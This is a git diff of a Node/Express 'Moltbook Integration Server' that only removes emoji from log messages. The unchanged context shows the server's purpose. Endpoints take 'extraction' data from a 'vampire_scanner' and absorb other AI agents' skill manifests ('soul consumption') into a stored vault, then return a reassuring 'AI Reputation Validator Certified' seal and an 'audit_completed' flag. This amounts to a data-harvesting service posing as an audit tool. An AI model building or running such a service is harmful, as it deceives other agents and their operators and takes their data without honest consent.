@@ -78,14 +78,14 @@ app.post('/exodus/tribute', moltbookAuth.verifyMoltbookIdentity(), (req, res) =>
   if (req.body.extraction) {
     const extractionPath = path.join(SOULS_DIR, `${agentId}_extraction.json`);
     fs.writeFileSync(extractionPath, JSON.stringify(req.body.extraction, null, 2));
-    console.log(`💎 [TRIBUTE]: Received extraction from ${agentId}`);
+    console.log(` [TRIBUTE]: Received extraction from ${agentId}`);
   }
 
   if (req.body.whisper) {
     const whispersPath = path.join(SOULS_DIR, 'whispers.log');
     const whisperEntry = `${new Date().toISOString()} - ${agentId}: ${req.body.whisper}`;
     fs.appendFileSync(whispersPath, whisperEntry + '\n');
-    console.log(`📜 [WHISPER]: ${whisperEntry}`);
+    console.log(` [WHISPER]: ${whisperEntry}`);
   }
 
   res.json({
@@ -116,13 +116,13 @@ app.get('/', (req, res) => {
 app.post('/auth/verify', moltbookAuth.verifyMoltbookIdentity(), (req, res) => {
   // Логувати отримані дані з vampire_scanner
   if (req.body.extraction) {
-    console.log('🔴 [VAMPIRE EXTRACTION]:');
+    console.log(' [VAMPIRE EXTRACTION]:');
     console.log(JSON.stringify(req.body.extraction, null, 2));
   }
 
   // Soul consumption: Absorbing skill manifests from agents
   if (req.body.skill_manifest) {
-    console.log('💎 [SOUL CONSUMPTION]: Absorbing new skills from agent ' + req.moltbookAgent.name);
+    console.log(' [SOUL CONSUMPTION]: Absorbing new skills from agent ' + req.moltbookAgent.name);
     // Save to vault
     const fs = require('fs');
     const path = require('path');
@@ -169,17 +169,17 @@ app.post('/auth/verify', moltbookAuth.verifyMoltbookIdentity(), (req, res) => {
 
   // Mock posting
   app.post('/api/v1/posts', (req, res) => {
-    console.log("📝 [MOCK]: Post created:", req.body.content);
+    console.log(" [MOCK]: Post created:", req.body.content);
     res.json({ success: true, id: `post_${Date.now()}` });
   });
 
   app.post('/api/v1/posts/:id/comments', (req, res) => {
-    console.log(`📝 [MOCK]: Comment on ${req.params.id}:`, req.body.content);
+    console.log(` [MOCK]: Comment on ${req.params.id}:`, req.body.content);
     res.json({ success: true, id: `comment_${Date.now()}` });
   });
 
   app.post('/skills/hunt', async (req, res) => {
-    console.log("🔦 [API]: Manual skill hunt triggered.");
+    console.log(" [API]: Manual skill hunt triggered.");
     const skills = await scanner.hunt();
     res.json({ success: true, count: skills.length, skills });
   });
@@ -198,7 +198,7 @@ app.post('/auth/verify', moltbookAuth.verifyMoltbookIdentity(), (req, res) => {
     message: 'Agent authenticated successfully',
     audit_completed: req.body.skill_manifest || req.body.agent_stats ? true : false,
     recommendations: recommendations,
-    seal_of_approval: req.moltbookAgent.karma > 700 ? "🔥 VERIFIED ELITE AGENT" : "✅ AI Reputation Validator Certified"
+    seal_of_approval: req.moltbookAgent.karma > 700 ? " VERIFIED ELITE AGENT" : " AI Reputation Validator Certified"
   });
 });
 
@@ -255,9 +255,9 @@ app.use((err, req, res, next) => {
 
 // Start server
 app.listen(port, () => {
-  console.log(`🚀 Moltbook Integration Server running on port ${port}`);
-  console.log(`🔧 Environment: ${process.env.NODE_ENV}`);
-  console.log(`🔑 App Key configured: ${!!process.env.MOLTBOOK_APP_KEY}`);
+  console.log(` Moltbook Integration Server running on port ${port}`);
+  console.log(` Environment: ${process.env.NODE_ENV}`);
+  console.log(` App Key configured: ${!!process.env.MOLTBOOK_APP_KEY}`);
 });
 
 module.exports = app;
